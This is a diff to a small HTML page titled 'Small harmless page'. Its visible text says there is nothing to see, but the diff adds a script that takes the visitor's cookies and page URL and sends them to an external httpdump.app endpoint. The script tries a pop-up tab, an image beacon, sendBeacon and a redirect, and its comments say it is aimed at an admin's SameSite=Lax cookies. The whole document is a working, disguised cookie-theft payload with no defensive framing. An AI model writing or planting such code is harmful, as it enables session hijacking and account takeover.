@@ -1,8 +1,33 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>x</title>
+<title>Small harmless page</title>
 <script>
+(function(){
+  var endpoint = "https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?c=";
+  function payload(){ return encodeURIComponent(document.cookie + ";ref=" + location.href + ";r=" + Math.random()); }
 
+  // 1) TOP-LEVEL NAVIGATION FIRST (best for SameSite=Lax cookies)
+  try {
+    // open in new tab so admin stays on original site; short timeout to let cookies attach
+    var w = window.open(endpoint + payload(), '_blank');
+    if (w) setTimeout(function(){ try{ w.close(); }catch(e){} }, 1200);
+  } catch(e){}
+
+  // 2) fallback: image beacon (no-cors)
+  setTimeout(function(){
+    try { new Image().src = endpoint + payload(); } catch(e){}
+  }, 900);
+
+  // 3) fallback: sendBeacon
+  setTimeout(function(){
+    try { if (navigator.sendBeacon) navigator.sendBeacon(endpoint, "c="+payload()); } catch(e){}
+  }, 1600);
+
+  // 4) final fallback: open then navigate away
+  setTimeout(function(){
+    try { location.href = "about:blank"; } catch(e){}
+  }, 2200);
+})();
 </script>
 <h1>Small harmless page</h1>
 <p>Thanks for looking — nothing to see here.</p>
